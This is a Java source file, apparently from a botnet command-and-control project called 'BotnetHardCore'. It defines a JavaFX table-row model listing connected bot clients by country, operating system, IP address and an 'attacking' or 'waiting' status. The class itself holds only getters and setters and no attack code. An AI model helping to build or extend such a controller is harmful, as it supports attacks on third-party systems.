package br.com.client.server.model;

import javafx.beans.property.*;
import model.ConnectionData;
import model.constant.ClientStatusEnum;

import java.net.InetAddress;
import java.time.LocalDateTime;

/**
 * Project: BotnetHardCore
 * ClientTableRow: Jeferson Machado <jefersonmachado@univille.br>
 * Date: 22/07/2018
 * Time: 19:05
 */
public class ClientTableRow {

    private IntegerProperty id;
    private StringProperty name;
    private StringProperty country;
    private StringProperty operationSystem;
    private StringProperty ipAddress;
    private ObjectProperty<LocalDateTime> connectionTime;
    private StringProperty status;

    /**
     * Construtor padrao
     */
    public ClientTableRow() {
    }

    public ClientTableRow(int id, String name, String country, String operationSystem, InetAddress ip) {
        this.id = new SimpleIntegerProperty(id);
        this.name = new SimpleStringProperty(name);
        this.country = new SimpleStringProperty(country);
        this.operationSystem = new SimpleStringProperty(operationSystem);
        this.ipAddress = new SimpleStringProperty(ip.getHostAddress());
        this.connectionTime = new SimpleObjectProperty<>(LocalDateTime.now());
        setStatus(ClientStatusEnum.STAND_BY);
    }

    public static ClientTableRow create(ConnectionData content, int id) {
        return new ClientTableRow(id, content.getName(), content.getCountry(), content.getOperationalSystemName(), content.getIpAddress());
    }

    public String getStatus() {
        return status.get();
    }

    public void setStatus(ClientStatusEnum status) {
        if (this.status == null) {
            this.status = new SimpleStringProperty();
        }

        if (status == ClientStatusEnum.ATTACKING) {
            this.status.set("Atacando");
        } else if (status == ClientStatusEnum.STAND_BY) {
            this.status.set("Aguardando");
        }
    }

    public StringProperty statusProperty() {
        return status;
    }

    public int getId() {
        return id.get();
    }

    public IntegerProperty idProperty() {
        return id;
    }

    public String getName() {
        return name.get();
    }

    public StringProperty nameProperty() {
        return name;
    }

    public String getCountry() {
        return country.get();
    }

    public StringProperty countryProperty() {
        return country;
    }

    public String getOperationSystem() {
        return operationSystem.get();
    }

    public StringProperty operationSystemProperty() {
        return operationSystem;
    }

    public String getIpAddress() {
        return ipAddress.get();
    }

    public StringProperty ipAddressProperty() {
        return ipAddress;
    }

    public LocalDateTime getConnectionTime() {
        return connectionTime.get();
    }

    public ObjectProperty<LocalDateTime> connectionTimeProperty() {
        return connectionTime;
    }

    @Override
    public String toString() {
        return "[" + getName() + "]-[" + getCountry() + "][" + getIpAddress() + "]";
    }
}
